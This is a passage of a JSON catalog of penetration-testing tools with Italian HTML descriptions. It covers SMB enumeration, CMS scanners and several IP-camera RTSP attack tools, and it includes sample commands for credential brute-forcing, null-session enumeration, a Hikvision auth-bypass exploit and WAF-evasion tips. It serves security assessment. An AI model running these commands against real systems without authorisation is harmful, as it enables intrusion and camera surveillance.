fase di discovery (totalmente passiva). Il traffico viene generato solo quando si testano i parametri trovati.</p><p><strong>Mitigazioni:</strong> Nessuna necessaria per la fase di discovery. Attenzione quando si inizia il probing attivo degli URL trovati (molti potrebbero essere 404).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "01_Recon",
      "Web",
      "Params_Discovery"
    ],
    "notes": null
  },
  {
    "id": "smb-enum",
    "name": "SMB-enum",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Metodologia e raccolta tool (smbclient, rpcclient, nmap) per enumerazione profonda del servizio SMB: share, utenti, gruppi e permessi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SMB-enum non è un singolo software ma rappresenta l'insieme delle tecniche e tool standard utilizzati per interrogare il servizio SMB/RPC (porta 445/139). Questa fase è critica nei test interni perché SMB spesso espone informazioni preziose (user enumeration via RID cycling, null sessions) o accessi diretti (share scrivibili) che permettono di ottenere un foothold senza exploit complessi.</p><br><hr><h4 class=\"rt-purple\">Tecniche e Tool</h4><p><strong>Null Session & Guest Access:</strong> Verifica se è possibile connettersi senza credenziali (<code>rpcclient -U \"\"</code> o <code>smbclient -N</code>). Se abilitato, permette di enumerare utenti e password policy.</p><p><strong>RID Cycling:</strong> Tecnica che interroga ciclicamente gli ID relativi (RID) degli account per mappare username e gruppi, efficace anche se la lista utenti è protetta.</p><p><strong>Share Enumeration:</strong> Scansione dei permessi su cartelle condivise (SYSVOL, NETLOGON, profili) per trovare file sensibili o punti di scrittura.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Si basa su utility Linux standard o script Nmap.</p><pre><code># Listare share con smbclient (Null session)\nsmbclient -L //192.168.1.10 -N\n\n# Enumerazione utenti via rpcclient\nrpcclient -U \"\" 192.168.1.10 -c \"enumdomusers\"\n\n# Nmap script automation\nnmap -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery target_ip\n\n# Tool automatizzato alternativo: enum4linux-ng\nenum4linux-ng -A 192.168.1.10</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>È il primo passo in un <strong>Internal Pentest</strong> dopo il discovery degli host. Spesso rivela account \"Guest\" attivi o share configurate male (\"Everyone: Full Control\") che offrono accesso immediato. L'enumerazione della Password Policy via SMB è fondamentale per calibrare i successivi attacchi di password spraying senza bloccare account.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Tentativi di Null Session e scansioni Nmap sono loggati e rilevati da IDS. Il RID Cycling genera molti errori se non mirato.</p><p><strong>Mitigazioni:</strong> Usare traffico mirato. Se si possiedono credenziali valide, usarle sempre invece di tentare accessi anonimi che sono più sospetti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "02_Enumeration",
      "Infrastructure",
      "SMB"
    ],
    "notes": null
  },
  {
    "id": "postman",
    "name": "Postman",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://www.postman.com/downloads/",
    "desc": "Piattaforma di collaborazione per API development, usata in security per testare, fuzzare e manipolare endpoint REST/GraphQL/SOAP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Sebbene nato per sviluppatori, Postman è inestimabile per l'API Security Testing. Permette di costruire collezioni di richieste HTTP complesse, gestire autenticazioni (OAuth2, JWT, Bearer) e scriptare test automatici. È l'interfaccia ideale per interagire con API che non hanno un frontend web, permettendo di testare IDOR, Mass Assignment e Broken Authentication.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Collection Runner:</strong> Esegue sequenze di richieste automatiche, utile per fuzzing leggero o per riprodurre catene di exploit logici.</p><p><strong>Environment Variables:</strong> Gestisce token dinamici e variabili, facilitando il testing su ambienti diversi (dev/prod) senza riscrivere le richieste.</p><p><strong>Proxy Capture:</strong> Può catturare traffico dal browser o da mobile app per costruire automaticamente la collezione API da testare.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>GUI Desktop o Web. Importare una specifica Swagger/OpenAPI se disponibile.</p><pre><code># Workflow Security\n1. Importare Swagger file (target.yaml)\n2. Configurare Authorization (es. Bearer Token)\n3. Modificare ID nell'endpoint GET /users/{id} per testare BOLA\n4. Inviare payload JSON malformati per testare validazione</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>API Pentest:</strong> Quando si testa un backend REST, Postman offre un controllo granulare sui verbi HTTP (PUT, DELETE, PATCH) e sugli header, spesso necessario per trovare vuln che il browser non mostra.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Non è uno scanner automatico di vulnerabilità (anche se esistono plugin), richiede input manuale intelligente.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "02_Enumeration",
      "Web",
      "API"
    ],
    "notes": null
  },
  {
    "id": "cmseek-v-1-1-3",
    "name": "CMSeeK",
    "version": "1.1.3",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Tuhinshubhra/CMSeeK",
    "desc": "Scanner avanzato per rilevamento e analisi di oltre 180 CMS, con detection versione, plugin e vulnerabilità note.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>CMSeek è uno dei tool di fingerprinting più completi per Content Management Systems. Non si limita a WordPress o Joomla, ma supporta oltre 180 piattaforme diverse (Drupal, Magento, Wix, ecc.). Esegue una \"Deep Scan\" per identificare la versione esatta del CMS, enumerare gli utenti, trovare plugin installati e suggerire exploit pubblici noti per la configurazione rilevata.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Deep Scan & Version Detection:</strong> Analizza codice sorgente, file statici, header HTTP e file di errore per determinare la versione precisa del CMS, fondamentale per mappare le CVE.</p><p><strong>Modularità:</strong> Include moduli specifici per WordPress (user enum, plugin enumeration) e Joomla (file backup finding), offrendo funzionalità simili a WPScan ma in un tool unificato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Interfaccia a riga di comando interattiva o diretta.</p><pre><code># Scansione standard URL\npython3 cmseek.py -u https://target.com\n\n# Scansione batch da lista siti\npython3 cmseek.py -l sites.txt --batch</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Fase preliminare di <strong>Web Assessment</strong>. Quando ci si trova di fronte a un sito web sconosciuto, CMSeek identifica rapidamente la tecnologia sottostante, permettendo di scegliere poi tool di exploit specifici (es. usare WPScan solo se è confermato WordPress).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le scansioni sono attive e generano traffico riconoscibile. I WAF moderni bloccano spesso le richieste di fingerprinting se non offuscate (User-Agent).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "02_Enumeration",
      "Web",
      "CMS"
    ],
    "notes": null
  },
  {
    "id": "cmsmap",
    "name": "CMSmap",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/dionach/CMSmap",
    "desc": "Scanner di vulnerabilità Python per CMS (WordPress, Joomla, Drupal, Moodle) con rilevamento plugin, temi e brute-force.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>CMSmap è uno strumento centralizzato per l'audit di sicurezza dei Content Management System più diffusi. Automatizza il processo di fingerprinting per identificare versioni, plugin e temi installati, correlandoli con database di exploit pubblici (Exploit-DB) per segnalare vulnerabilità note. Integra anche moduli per attacchi di forza bruta e post-exploitation basilare.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-CMS Support:</strong> Rileva e scansiona automaticamente WordPress, Joomla, Drupal e Moodle, adattando le tecniche di enumerazione alla piattaforma target senza bisogno di configurazione manuale.</p><p><strong>Vulnerability Mapping:</strong> Scarica e mantiene aggiornato un database locale di exploit. Quando rileva un plugin o una versione specifica, controlla se esistono PoC (Proof of Concept) disponibili, fornendo link diretti alle vulnerabilità.</p><p><strong>Deep Enumeration:</strong> Esegue l'enumerazione degli utenti, scan dei file di backup, e directory listing. Include un modulo per il cracking delle password via dizionario contro i pannelli di login amministrativi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'esecuzione standard richiede solo l'URL del target. Il tool riconosce automaticamente il tipo di CMS.</p><pre><code># Scansione completa automatica\ncmsmap.py https://target-blog.com\n\n# Scansione WordPress con utente specifico per brute-force\ncmsmap.py https://wp-site.com -u admin -p passwords.txt\n\n# Aggiornamento database exploit\ncmsmap.py -U PC</code></pre><p>Per evitare falsi positivi o scansioni troppo lente, è possibile disabilitare il check degli exploit con <code>--noedb</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Ideale nella fase di <strong>Web Application Assessment</strong> quando si incontrano installazioni standard di CMS. Permette di identificare rapidamente \"low hanging fruits\" come plugin non aggiornati da anni o configurazioni di default, prima di passare a test manuali più approfonditi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le scansioni complete (Full Scan) generano migliaia di richieste HTTP in breve tempo, facilmente bloccabili da WAF e plugin di sicurezza (es. Wordfence). Il brute-force triggera immediatamente alert di login falliti.</p><p><strong>Mitigazioni:</strong> Usare user-agent custom. Evitare il brute-force se non strettamente necessario. Preferire scansioni passive o mirate se il WAF è attivo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "02_Enumeration",
      "Web",
      "CMS"
    ],
    "notes": null
  },
  {
    "id": "joomlascan",
    "name": "JoomlaScan",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/drego85/JoomlaScan",
    "desc": "Scanner di vulnerabilità per Joomla: rileva versione, componenti installati, firewall e misconfigurazioni note.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Joomlascan è l'equivalente di WPScan per il mondo Joomla. È progettato per enumerare la versione del core (analizzando file XML manifest o header), identificare componenti di terze parti installati e verificare se esistono exploit noti per essi. Offre una panoramica rapida della postura di sicurezza del CMS.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Version Detection:</strong> Usa metodi euristici multipli per determinare la versione precisa, anche se offuscata nel meta tag generator.</p><p><strong>Component Enumeration:</strong> Cerca path noti di componenti popolari (es. <code>com_users</code>, <code>com_media</code>) per mappare la superficie d'attacco.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Esecuzione perl o python.</p><pre><code># Scansione base\nperl joomlascan.pl -u https://target.com\n\n# Enumerazione componenti aggressiva\nperl joomlascan.pl -u https://target.com -ec</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Reconnaissance:</strong> Prima di lanciare exploit, è fondamentale sapere se il target usa Joomla 3.x o 4.x. Joomlascan fornisce questa intelligence.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Rumoroso. Esegue molte richieste GET che generano 404 (Not Found) nei log.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "02_Enumeration",
      "Web",
      "CMS",
      "Joomla"
    ],
    "notes": null
  },
  {
    "id": "katana-linux-amd64",
    "name": "katana_linux_amd64",
    "version": "1.2.2",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/projectdiscovery/katana",
    "desc": "Crawler e spider web di nuova generazione per discovery approfondita di endpoint, file JS e parametri nascosti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Katana (di ProjectDiscovery) è un crawler web progettato per l'era delle Single Page Application (SPA). A differenza dei crawler tradizionali, utilizza un motore headless (controllando Chrome) per renderizzare ed eseguire JavaScript, scoprendo link ed endpoint che vengono generati dinamicamente lato client e che sfuggirebbero a una semplice analisi HTML statica.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Headless Crawling:</strong> Esegue il codice JS della pagina per trovare link XHR/Fetch, essenziale per app React/Vue/Angular.</p><p><strong>Input Parsing:</strong> Estrae non solo URL, ma anche form, parametri e file JavaScript, alimentando pipeline di fuzzing o vulnerability scanning.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Esecuzione standard o via pipe.</p><pre><code># Crawling base\n./katana -u https://target.com\n\n# Crawling con headless mode e estrazione JS\n./katana -u https://target.com -jc -headless -d 2</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Modern Web Pentest:</strong> Per mappare correttamente la superficie d'attacco di applicazioni web moderne dove gran parte del routing avviene lato client. Ottimo per alimentare tool come Nuclei o ParamSpider.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il crawling headless è lento e genera molto traffico. Comporta l'esecuzione di script di tracciamento sul target.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "02_Enumeration",
      "Web",
      "Crawling",
      "Active"
    ],
    "notes": null
  },
  {
    "id": "findsploit-2-0",
    "name": "Findsploit",
    "version": "2.0",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/1N3/Findsploit",
    "desc": "Utility CLI per ricerca rapida di exploit in database locali (Exploit-DB) e online (PacketStorm, NVD) simultaneamente.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Findsploit è uno script wrapper che potenzia la ricerca di exploit. A differenza di <code>searchsploit</code> che cerca solo nel database locale di Exploit-DB, Findsploit interroga simultaneamente repository online multipli, inclusi PacketStorm, NVD e CVE details. È progettato per trovare PoC recenti che potrebbero non essere ancora stati indicizzati nel database locale di Kali.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Ricerca Ibrida:</strong> Combina risultati offline (veloci) con query online (aggiornate), offrendo una copertura completa.</p><p><strong>Download Diretto:</strong> Facilita il download del codice sorgente dell'exploit nella directory di lavoro corrente per analisi o compilazione immediata.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Sintassi semplice da riga di comando.</p><pre><code># Ricerca generica per servizio\nfindsploit wordpress 5.0\n\n# Ricerca specifica CVE\nfindsploit CVE-2024-1234</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la fase di <strong>Vulnerability Analysis</strong>, quando uno scanner riporta una CVE ma Metasploit non ha un modulo. Findsploit aiuta a trovare rapidamente script PoC Python o C da adattare manualmente.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Scaricare ed eseguire exploit da internet comporta rischi. Analizzare sempre il codice prima dell'esecuzione per evitare malware o danni non intenzionali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "cameradar-5-0-4",
    "name": "cameradar",
    "version": "5.0.4",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Ullaakut/cameradar",
    "desc": "Scanner specializzato per discovery e accesso a telecamere RTSP di sorveglianza, con bruteforce di credenziali e route.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Cameradar è uno strumento offensivo progettato per l'accesso non autorizzato a flussi di videosorveglianza RTSP (Real Time Streaming Protocol). Scansiona intere subnet alla ricerca di porte RTSP aperte (default 554, 8554) e tenta di determinare il modello della telecamera e il percorso corretto dello stream. Successivamente, esegue attacchi a dizionario per indovinare le credenziali di accesso, verificando se lo stream è accessibile.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Route Discovery:</strong> Le telecamere usano percorsi diversi (es. <code>/live</code>, <code>/ch0</code>, <code>/h264</code>). Cameradar include un database di migliaia di path noti per identificare quello corretto anche senza credenziali.</p><p><strong>Credential Bruteforcing:</strong> Tenta l'accesso usando liste di credenziali di default specifiche per produttori di telecamere (Hikvision, Dahua, Axis), riducendo il tempo rispetto a un bruteforce generico.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Si utilizza specificando target e porte.</p><pre><code># Scansione subnet con output JSON\n./cameradar -t 192.168.1.0/24 -p 554,8554 --json-output results.json\n\n# Bruteforce su target specifico con wordlist custom\n./cameradar -t 10.0.0.50 -u user.txt -P pass.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nei <strong>Physical Security Assessment</strong>, dimostrare di poter accedere alle telecamere interne permette di mappare i movimenti delle guardie o vedere codici digitati sui tastierini. Spesso le telecamere sono su VLAN separate ma accessibili per misconfigurazione di routing.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Molto rumoroso. Tentativi di connessione RTSP falliti riempiono i log degli NVR. Può causare il blocco temporaneo del flusso video su dispositivi hardware datati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "hikpwn",
    "name": "HikPwn",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/4n4nk3/HikPwn",
    "desc": "Tool scanner ed exploit per telecamere Hikvision vulnerabili a bypass autenticazione (CVE-2017-7921) e command injection.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>HikPwn è uno strumento offensivo mirato ai dispositivi di videosorveglianza Hikvision. Automatizza la rilevazione di vulnerabilità critiche come la CVE-2017-7921, che permette di bypassare l'autenticazione modificando l'URL, e la CVE-2021-36260 per l'esecuzione remota di codice (RCE). Il tool può estrarre snapshot, configurazioni utente e decifrare password direttamente dalla memoria del dispositivo.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Auth Bypass:</strong> Verifica se il dispositivo soffre dell'improper authentication token bug, permettendo di scaricare la lista utenti senza password.</p><p><strong>Config Decryptor:</strong> Include un modulo per scaricare e decifrare il file di configurazione (contenente credenziali in chiaro) dai modelli vulnerabili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Script Python standalone.</p><pre><code># Scansione range IP\npython3 hikpwn.py -t 192.168.1.0/24\n\n# Exploit target specifico per estrarre utenti\npython3 hikpwn.py -t 192.168.1.50 --exploit users</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>IoT Security Assessment:</strong> Le telecamere sono spesso il punto di ingresso più debole in una rete fisica. HikPwn permette di dimostrare come un attaccante possa prendere il controllo della videosorveglianza senza conoscere la password.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le richieste malformate agli endpoint <code>/System/deviceInfo</code> o <code>/Security/users</code> sono loggate. L'RCE può causare riavvii del dispositivo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "rtsp-routes-wordlist",
    "name": "routes_wordlist.txt",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Wordlist specializzata contenente path di API, endpoint e route di framework moderni (Rails, Django, Spring) per discovery.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>A differenza delle wordlist generiche di directory, <code>routes.txt</code> (spesso associata a Jhaddix o SecLists) è focalizzata sulle \"rotte\" applicative. Include pattern tipici di API REST (<code>/api/v1/user</code>), endpoint di debug di framework (<code>/actuator/heapdump</code>), e route amministrative che non corrispondono a file fisici ma a controller logici. È densa e ottimizzata per applicazioni moderne.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Context Aware:</strong> Contiene endpoint specifici per Spring Boot, Ruby on Rails, Node.js.</p><p><strong>High Value:</strong> Privilegia percorsi che portano a PII, configurazioni o takeover (es. <code>/console</code>, <code>/graphql</code>).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Con Gobuster o Ffuf.</p><pre><code>ffuf -u https://api.target.com/FUZZ -w routes_wordlist.txt -mc 200</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>API Discovery:</strong> Quando si testa un'applicazione Single Page o Mobile backend, questa lista trova gli endpoint nascosti che non sono linkati nel frontend.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Molto grande. Usare filtri di status code per non annegare nei falsi positivi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "rtsp-authgrinder",
    "name": "rtsp_authgrinder",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/tektengu/rtsp_authgrinder",
    "desc": "Bruteforcer puro per protocollo RTSP, focalizzato sulla velocità di test delle credenziali su servizi già identificati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>rtsp_authgrinder è uno strumento dedicato esclusivamente alla fase di \"Cracking\". A differenza degli scanner che cercano host, questo tool assume che il target (IP:Porta) sia già noto e si concentra sul martellare il servizio di autenticazione. È scritto per essere leggero e veloce, supportando wordlist personalizzate per utenti e password, ed è spesso utilizzato in catena con altri tool di discovery.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Dictionary Attack:</strong> Itera combinazioni user:pass contro il servizio RTSP.</p><p><strong>Error Handling:</strong> Gestisce intelligentemente i timeout e le disconnessioni tipiche dei dispositivi IoT instabili, riprovando le credenziali se la connessione cade per motivi di rete e non per auth fallita.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Esecuzione da riga di comando.</p><pre><code># Attacco base\n./rtsp_authgrinder -t 192.168.1.10 -p 554 -U users.txt -P pass.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Penetration Testing mirato:</strong> Quando si trova una telecamera critica (es. sala server) e si vuole tentare un attacco esaustivo per accedervi. La gestione degli errori lo rende preferibile a Hydra su connessioni instabili.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera log di \"Login Failed\" massivi sul dispositivo. Può causare il blocco temporaneo dell'account admin se il dispositivo implementa lockout (raro su IoT economici).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "rtsp-crack-1-0-3",
    "name": "rtsp_crack",
    "version": "1.0.3",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Tool semplice per testare credenziali di default e comuni su stream RTSP, utile per verifiche rapide di misconfigurazione.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>rtsp_crack è uno script di verifica rapida (\"Check & Go\"). Invece di eseguire un bruteforce esaustivo, utilizza un database interno o ridotto delle credenziali di fabbrica più comuni per i principali produttori di telecamere (Axis, Panasonic, Samsung, etc.). È progettato per la velocità: verifica se il dispositivo è lasciato con le impostazioni di default in pochi secondi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Default Credential Check:</strong> Prova una lista curata di \"Top 20\" credenziali IoT.</p><p><strong>Stream Validation:</strong> Non si limita al login, ma prova a negoziare lo stream (DESCRIBE/SETUP) per confermare che il video sia effettivamente accessibile e non solo l'interfaccia di gestione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Script bash o python.</p><pre><code># Check rapido su target\npython3 rtsp_crack.py 192.168.1.50</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Vulnerability Assessment:</strong> Durante un audit di conformità, permette di verificare rapidamente se le policy di cambio password al primo avvio sono state rispettate dagli installatori.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Meno efficace contro password custom, ma molto silenzioso (pochi tentativi) rispetto a un bruteforcer completo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "rtsp-digest-auth-bruteforcer",
    "name": "RTSP-Digest-Auth-Bruteforcer",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Script specializzato per attaccare l'autenticazione Digest (più sicura della Basic) su stream RTSP tramite dizionario.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo tool nasce per colmare una lacuna specifica: molti bruteforcer RTSP supportano solo l'autenticazione \"Basic\" (in chiaro). <strong>rtsp-digest-auth-bruteforcer</strong> è progettato per gestire il challenge-response dell'autenticazione Digest, calcolando correttamente gli hash MD5 necessari per ogni tentativo di password. È essenziale contro telecamere IP moderne o configurate con livelli di sicurezza più elevati dove i tool generici falliscono.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Digest Handling:</strong> Intercetta il nonce fornito dal server e genera la risposta hash valida per ogni password della wordlist, automatizzando il processo matematico del protocollo.</p><p><strong>Targeting Mirato:</strong> Ottimizzato per colpire singoli flussi video persistenti, ideale per \"aprire\" una telecamera specifica individuata durante la ricognizione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede Python e una lista di credenziali.</p><pre><code># Attacco su target specifico con user 'admin'\npython3 rtsp-digest-brute.py -u rtsp://192.168.1.50:554/live -U admin -W passwords.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>High-Security IoT Audit:</strong> Quando Nmap segnala la porta 554 aperta ma Hydra o altri tool falliscono perché il dispositivo rifiuta l'auth Basic. Questo script permette di testare la robustezza delle password anche sotto auth Digest.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'autenticazione Digest richiede più pacchetti (4-way handshake) rispetto alla Basic, rendendo l'attacco più lento e più rumoroso a livello di traffico di rete.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "rtsp-findingsomefun",
    "name": "RTSP-FindingSomeFun",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ThatNotEasy/RTSP-FindingSomeFun",
    "desc": "Scanner RTSP massivo multi-thread per discovery di porte 554 e bruteforce simultaneo di path e credenziali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>RTSP-FindingSomeFun è uno strumento aggressivo di discovery pensato per scansionare ampi range di indirizzi IP (o l'intera internet). Combina un port scanner veloce con un motore di bruteforce per identificare telecamere esposte. La sua caratteristica distintiva è la velocità: utilizza il multithreading spinto per verificare migliaia di host, cercando di indovinare sia il percorso dello stream (es. <code>/live.sdp</code>) che le credenziali di accesso in un unico passaggio.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Mass Scanning:</strong> Accetta in input liste di IP o range CIDR, ignorando rapidamente gli host chiusi per concentrarsi sulle porte 554 attive.</p><p><strong>Smart Brute:</strong> Testa combinazioni di credenziali di default (admin/admin, admin/12345) e path comuni specifici per vendor (Hikvision, Dahua), massimizzando le probabilità di successo su device non configurati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Clonare la repo e lanciare lo script principale.</p><pre><code># Scansione da lista IP\npython3 rtsp.py -i ip_list.txt -t 500\n\n# Scansione range con output personalizzato\npython3 rtsp.py -r 192.168.0.0/16 --output found.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Large Scale Recon:</strong> Ideale per mappare la superficie d'attacco IoT di un'intera organizzazione o città. Permette di trovare rapidamente dispositivi dimenticati o installati da terzi senza autorizzazione (Shadow IT).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Estremamente rumoroso (\"Noisy\"). Genera un volume di traffico che viene immediatamente flaggato da firewall e IPS come scansione ostile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "rtspscanner",
    "name": "RTSPScanner",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/BeardedTek-com/RTSPScanner",
    "desc": "Utility Python per enumerare stream RTSP su intere subnet, verificare percorsi comuni e catturare screenshot di anteprima.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>RTSPScanner è uno strumento progettato per la ricognizione di dispositivi IoT e telecamere di sicurezza che espongono il protocollo Real Time Streaming Protocol (RTSP). A differenza di un semplice port scanner, questo tool tenta attivamente di connettersi al servizio sulla porta 554 (o custom) e bruteforza i percorsi delle risorse (es. <code>/live</code>, <code>/h264</code>) per verificare l'accesso allo stream video, spesso non protetto da autenticazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Mass Scanning:</strong> Accetta in input range CIDR o liste di IP e scansiona rapidamente la porta 554 in multithreading. È ottimizzato per gestire timeout brevi, permettendo di analizzare vaste reti IoT in tempi ridotti.</p><p><strong>Path Brute-forcing:</strong> Una volta rilevata una porta aperta, itera attraverso un dizionario interno di percorsi RTSP comuni (utilizzati da vendor come Hikvision, Dahua, Axis) per individuare l'URL esatto dello stream.</p><p><strong>Verifica Accesso:</strong> Tenta di stabilire una connessione allo stream. Se il server risponde positivamente (200 OK) senza richiedere credenziali, il tool lo segnala come vulnerabile e può tentare di salvare un frame immagine come prova (screenshot).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede Python e le dipendenze installate. L'input può essere un singolo IP o una subnet.</p><pre><code># Scansione di una subnet locale\npython3 RTSPScanner.py -t 192.168.1.0/24\n\n# Scansione con output su file e screenshot attivi\npython3 RTSPScanner.py -t targets.txt --screenshot --output results.json</code></pre><p>I risultati vengono forniti in formato strutturato, indicando IP, porta, path valido ed eventuale screenshot catturato nella cartella di 